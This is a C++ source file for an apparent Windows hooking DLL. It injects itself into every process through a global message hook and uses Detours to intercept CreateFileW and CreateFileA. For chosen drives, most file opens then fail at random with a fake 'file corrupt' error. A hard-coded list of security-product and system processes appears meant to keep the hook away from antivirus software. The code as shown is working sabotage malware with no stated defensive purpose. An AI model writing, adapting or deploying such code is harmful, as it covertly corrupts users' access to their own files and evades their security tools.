#include "USBHook.h"
#include "detours.h"

#ifndef _WIN64
	#pragma data_seg("UHshared32")
	HHOOK gHook = NULL;
	DWORD volmask = 0UL;
	#pragma data_seg()
	#pragma comment (linker, "/SECTION:UHshared32,RWS")
#else
	#pragma data_seg("UHshared64")
	HHOOK gHook = NULL;
	DWORD volmask = 0UL;
	#pragma data_seg()
	#pragma comment (linker, "/SECTION:UHshared64,RWS")
#endif

VOID SetHookOn()
{
	if (gHook)
		return;
	gHook = SetWindowsHookExA(WH_GETMESSAGE, GetMsgProc, gInst, 0);
}

VOID SetHookOff()
{
	if (!gHook)
		return;
	UnhookWindowsHookEx(gHook);
	gHook = NULL;
}

VOID SetMask(DWORD *mask)
{
	if(mask)
		volmask = *mask;
}

DWORD GetMask()
{
	return volmask;
}

BOOL CheckExe()
{
	if ((_wcsicmp(szPath, L"HipsDaemon.exe") == 0)
		|| (_wcsicmp(szPath, L"HipsTray.exe") == 0)
		|| (_wcsicmp(szPath, L"HipsMain.exe") == 0)
		|| (_wcsicmp(szPath, L"usysdiag.exe") == 0)
		|| (_wcsicmp(szPath, L"wsctrlsvc.exe") == 0)
		)
		return TRUE;
	else if ((_wcsicmp(szPath, L"igfxEM.exe") == 0)
		|| (_wcsicmp(szPath, L"igfxCUIService.exe") == 0)
		)
		return TRUE;
	else if ((_wcsicmp(szPath, L"csrss.exe") == 0)
		|| (_wcsicmp(szPath, L"Taskmgr.exe") == 0)
		|| (_wcsicmp(szPath, L"winlogon.exe") == 0)
		|| (_wcsicmp(szPath, L"wininit.exe") == 0)
		|| (_wcsicmp(szPath, L"conhost.exe") == 0)
		|| (_wcsicmp(szPath, L"ctfmon.exe") == 0)
		|| (_wcsicmp(szPath, L"cwm.exe") == 0)
		|| (_wcsicmp(szPath, L"conhost.exe") == 0)
		|| (_wcsicmp(szPath, L"fontdrvhost.exe") == 0)
		|| (_wcsicmp(szPath, L"lsass.exe") == 0)
		|| (_wcsicmp(szPath, L"RAVCpl64.exe") == 0)
		|| (_wcsicmp(szPath, L"services.exe") == 0)
		|| (_wcsicmp(szPath, L"sihost.exe") == 0)
		|| (_wcsicmp(szPath, L"smss.exe") == 0)
		|| (_wcsicmp(szPath, L"spoolsv.exe") == 0)
		|| (_wcsicmp(szPath, L"svchost.exe") == 0)
		)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam)
{
	return CallNextHookEx(gHook, code, wParam, lParam);
}

BOOL ShouldLock(int v)
{
	if (volmask)
	{
		if (volmask & (1UL << v))
		{
			if (rand() % 5)
				return TRUE;
		}
	}
	return FALSE;
}

HANDLE WINAPI DetourCreateFileW(LPCWSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
	HANDLE hTemplateFile)
{
	int t = PathGetDriveNumberW(lpFileName);
	if (t >= 0)
		if (ShouldLock(t))
			if (!PathIsDirectoryW(lpFileName))
			{
				SetLastError(ERROR_FILE_CORRUPT);
				return INVALID_HANDLE_VALUE;
			}
	return OriginCreateFileW(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
}
HANDLE WINAPI DetourCreateFileA(LPCSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
	HANDLE hTemplateFile)
{
	int t = PathGetDriveNumberA(lpFileName);
	if (t >= 0)
		if (ShouldLock(t))
			if (!PathIsDirectoryA(lpFileName))
			{
				SetLastError(ERROR_FILE_CORRUPT);
				return INVALID_HANDLE_VALUE;
			}
	return OriginCreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
}

VOID DetourHookOn()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)OriginCreateFileW, DetourCreateFileW);
	DetourAttach(&(PVOID&)OriginCreateFileA, DetourCreateFileA);
	DetourTransactionCommit();
}

VOID DetourHookOff()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)OriginCreateFileW, DetourCreateFileW);
	DetourDetach(&(PVOID&)OriginCreateFileA, DetourCreateFileA);
	DetourTransactionCommit();
}
